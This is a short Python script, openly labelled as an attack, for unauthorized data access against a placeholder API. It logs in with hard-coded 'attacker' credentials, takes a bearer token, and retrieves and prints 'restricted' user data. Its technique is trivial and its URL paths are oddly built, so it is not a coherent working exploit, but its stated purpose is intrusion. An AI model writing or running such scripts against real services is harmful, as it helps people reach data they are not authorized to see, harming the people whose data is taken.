import requests

# Target URL for accessing data
TARGET_URL = 'http://vulnerable-api.com/get_user_data'

# User credentials (assuming credentials are exploited to gain unauthorized access)
CREDENTIALS = {
    'username': 'attacker',
    'password': 'password123'
}

# Function to perform unauthorized access
def unauthorized_data_access():
    def exploit_access():
        # Step 1: Obtain access token using the credentials
        auth_response = requests.post(f'{TARGET_URL}/login', json=CREDENTIALS)
        if auth_response.status_code == 200:
            token = auth_response.json().get('token')
            print("Access token obtained:", token)
        else:
            print("Failed to obtain access token:", auth_response.status_code)
            return

        # Step 2: Use the token to access restricted data
        headers = {'Authorization': f'Bearer {token}'}
        data_response = requests.get(f'{TARGET_URL}/restricted_data', headers=headers)
        if data_response.status_code == 200:
            print("Restricted data accessed successfully.")
            print("Data:", data_response.json())
        else:
            print("Failed to access restricted data:", data_response.status_code)
    
    # Perform the attack
    exploit_access()

# Run the unauthorized data access attack
unauthorized_data_access()
